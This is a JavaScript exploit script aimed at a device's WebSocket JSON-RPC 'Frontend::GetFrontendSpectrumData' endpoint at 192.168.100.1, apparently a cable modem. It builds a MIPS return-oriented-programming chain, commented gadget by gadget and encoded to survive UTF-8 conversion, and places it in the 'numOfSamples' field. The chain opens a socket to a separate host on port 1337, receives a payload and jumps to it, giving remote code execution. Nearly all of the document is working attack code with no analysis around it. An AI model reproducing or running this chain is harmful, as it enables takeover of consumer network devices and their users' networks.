function buf2hex(buffer) { // buffer is an ArrayBuffer
    return Array.prototype.map.call(new Uint8Array(buffer), x => ('00' + x.toString(16)).slice(-2)).join('');
}

function insertAt(arr, index, toInsert) {
    for(let i = 0; i < toInsert.length; i++) {
        arr[i+index]= toInsert[i];
    }
}

function testEqual(buf1, buf2)
{
    if (buf1.byteLength != buf2.byteLength) return false;
    var dv1 = new Int8Array(buf1);
    var dv2 = new Int8Array(buf2);
    for (var i = 0 ; i != buf1.byteLength ; i++)
    {
        if (dv1[i] != dv2[i]) return false;
    }
    return true;
}

arr = new Uint8Array(0x500);

arr.fill(0x41)

firstSp = 0x00
previousSp = firstSp
sp = previousSp+0xa0
insertAt(arr, previousSp+0x94-1, [0xc2, 0x80, 0xce, 0x84, 0x74]) 
// 0x80ce8474: addiu $a0, $zero, 2; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp-1, [0xf2, 0x80, 0x9e, 0x8e, 0xf0, 0x90, 0x80, 0x81]) 
//0x809e8ef0: addiu $a1, $zero, 1; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp-1, [0xe2, 0x80, 0x87, 0xd6, 0x94])
//0x809e8ef0: move $a2, $zero; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, firstSp+0x74-1, [0xc2, 0x80, 0xf3, 0x81, 0xa0, 0x80]) //set s1 = (socket() - 0x5428) == 0x80f381a0
insertAt(arr, previousSp-1, [0xc2, 0x80, 0xe6, 0xb1, 0xa4])
//0x80e6b1a4: move $v0, $s1; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;


previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x11, 0xca, 0x94])
//0x8011ca94: addiu $v0, $v0, 0x5428; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x29, 0x35, 0x38])
//0x80293538: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0x63, 0x5e, 0x38])
//0x80635e38: lw $ra, 0x3c($sp); lw $s6 0x38($sp) ... addiu $sp, $sp, 0x40

previousSp = sp
sp = previousSp+0x40
insertAt(arr, previousSp+0x20-1, [0xc2, 0x81, 0x38, 0x5b, 0x70]) //set $s0 = 0x81385b78 == socketAddr
insertAt(arr, previousSp+0x34-1, [0xe2, 0x80, 0x8b, 0x47, 0x70]) //set s5 = 0x808b4770
insertAt(arr, previousSp+0x3c-1, [0xf2, 0x80, 0x96, 0xbf, 0x64]) //set $ra
//0x8096bf64: sw $v0, 8($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
// sw $v0 (socket) @ 0x81385b78

//works -------------------------------

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0x14, 0xc4, 0xa8])
//0x8014c4a8: move $a0, $v0; move $v1, $v0; move $v0, $v1; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp-1, [0xc2, 0x80, 0x63, 0x5e, 0x38])
//0x80635e38: lw $ra, 0x3c($sp); lw $s6 0x38($sp) ... addiu $sp, $sp, 0x40

previousSp = sp
sp = previousSp+0x40
insertAt(arr, previousSp+0x20-1, [0x20, 0x20, 0x20, 0x20, 0x20]) //set $s0 = 0x20202020
insertAt(arr, previousSp+0x34-1, [0xe2, 0x80, 0x8b, 0x47, 0x70]) //set s5 = 0x808b4770
insertAt(arr, previousSp+0x3c-1, [0xc2, 0x80, 0xc, 0x65, 0x70])
//0x800c6570: move $a2, $s0; move $v0, $zero; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

// previousSp = sp
// sp = previousSp+0x10
// insertAt(arr, previousSp+0x04-1, [0xe2, 0x80, 0x8b, 0x47, 0x70])
// //0x808b4770: jalr $s5; nop; 

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0x53, 0x74, 0x68])
insertAt(arr, sp, [0x42, 0x02, 0x05, 0x39, 194, 168, 22, 11])
//0x80537468: move $a1, $sp; lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20; 

previousSp = sp
sp = previousSp+0x20
insertAt(arr, sp+0x30-1, [0xc2, 0x80, 0xf3, 0x85, 0x8c, 0x80]) //set v0 = connect - 0x5428 == 0x802866e8
insertAt(arr, previousSp+0x10-1, [0xe2, 0x80, 0x87, 0x3f, 0xd8, 0x80])
//0x80873fd8: lw $v0, 0x30($sp); lw $ra, 0x44($sp); lw $s0, 0x40($sp); jr $ra; addiu $sp, $sp, 0x50; 

previousSp = sp
sp = previousSp+0x50
insertAt(arr, previousSp+0x44-1, [0xc2, 0x80, 0x11, 0xca, 0x94])
//0x8011ca94: addiu $v0, $v0, 0x5428; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0xed, 0x8d, 0xac])
//0x80ed8dac: jalr $v0; nop; jr $ra; $sp, $sp, 0x10

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp-1, [0xc2, 0x80, 0xee, 0xac, 0x88])
//0x80eeac88: lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp-1, [0xc2, 0x81, 0x38, 0x5b, 0x78]) //set s0 = savedSocket @ 0x81385b78
insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x41, 0x3c, 0xe0, 0xa0, 0x80]) //set ra
//0x80413ce0: lw $a0, ($s0); lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x63, 0x5e, 0x38])
//0x80635e38: lw $ra, 0x3c($sp); lw $s6 0x38($sp) ... addiu $sp, $sp, 0x40

previousSp = sp
sp = previousSp+0x40
insertAt(arr, previousSp+0x24-1, [0xc2, 0x81, 0x38, 0x5c, 0x70]) //set $s1 = 0x81385c70
insertAt(arr, previousSp+0x3c-1, [0xe2, 0x80, 0x9b, 0x60, 0x54]) //set ra
//0x809b6054: move $a1, $s1; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp+0x8-1, [0xe2, 0x80, 0xb3, 0x7a, 0xd0, 0x80]) //set ra
//0x80b37ad0: addiu $a2, $zero, 0x400; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10; 

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0xb, 0x2e, 0xe8, 0xa0, 0x80])
//0x800b2ee8: move $a3, $zero; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp-1, [0xc2, 0x80, 0xf3, 0x96, 0x94, 0x80]) //set $s0 = (recv - 0x49f0) = 0x80f39694
insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0xec, 0xbd, 0xb8]) //set $ra
//0x80ecbdb8: move $v0, $s0; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x1f, 0xeb, 0x94, 0x80])
//0x801feb94: addiu $v0, $v0, 0x49f0; lw $ra, 0x18($sp); lw $s1, 0x14($sp); lw $s0, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

previousSp = sp
sp = previousSp+0x20
insertAt(arr, previousSp+0x18-1, [0xc2, 0x80, 0x29, 0x35, 0x38])
//0x80293538: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

//--------- sleep

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp+4-1, [0xc2, 0x80, 0xce, 0x84, 0x74]) 
// 0x80ce8474: addiu $a0, $zero, 2; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp-1, [0xc2, 0x80, 0x63, 0x5e, 0x38])
//0x80635e38: lw $ra, 0x3c($sp); lw $s6 0x38($sp) ... addiu $sp, $sp, 0x40

previousSp = sp
sp = previousSp+0x40
insertAt(arr, previousSp+0x20-1, [0xc2, 0x80, 0xf3, 0x90, 0x84, 0x80]) //set s0 = (sleep - 0xbf8) - 0xbc8
insertAt(arr, previousSp+0x34-1, [0xe2, 0x80, 0x8b, 0x47, 0x70]) //set s5 = 0x808b4770
insertAt(arr, previousSp+0x3c-1, [0xc2, 0x80, 0xec, 0xbd, 0xb8]) //set $ra
//0x80ecbdb8: move $v0, $s0; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10 
insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x6b, 0x13, 0x6c])
//0x806b136c: addiu $v0, $v0, 0xbf8; addiu $v0, $v0, 0xbc8; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp-1, [0xc2, 0x80, 0x29, 0x35, 0x38])
//0x80293538: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

//--------- sleep

// previousSp = sp
// sp = previousSp+0x10
// insertAt(arr, previousSp+0x04-1, [0xe2, 0x80, 0x8b, 0x47, 0x70])
// //0x808b4770: jalr $s5; nop; 

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp+0x4-1, [0xc2, 0x80, 0x63, 0x5e, 0x38])
//0x80635e38: lw $ra, 0x3c($sp); lw $s6 0x38($sp) ... addiu $sp, $sp, 0x40

previousSp = sp
sp = previousSp+0x40
insertAt(arr, previousSp+0x20-1, [0xc2, 0x81, 0x38, 0x5c, 0x70]) //set $s0 = 0x81385c70
insertAt(arr, previousSp+0x34-1, [0xe2, 0x80, 0x8b, 0x47, 0x70]) //set s5 = 0x808b4770
insertAt(arr, previousSp+0x3c-1, [0xc2, 0x80, 0xec, 0xbd, 0xb8]) //set $ra
//0x80ecbdb8: move $v0, $s0; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp+0x8-1, [0xc2, 0x80, 0x29, 0x35, 0x38])
//0x80293538: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

var string = new TextDecoder("utf-8").decode(arr);

var newArr = new TextEncoder("utf-8").encode(string);

console.log(buf2hex(newArr));

exploit = '{"jsonrpc":"2.0","method":"Frontend::GetFrontendSpectrumData","params":{"coreID":0,"fStartHz":0,"fStopHz":1000000000,"fftSize":1024,"gain":1,"numOfSamples":' + string + '},"id":"0"}'
console.log(exploit)

console.log(testEqual(arr, newArr));

socket = new WebSocket("ws://192.168.100.1:8080/Frontend", 'rpc-frontend');

socket.onopen = function(e) {
    socket.send(exploit)
};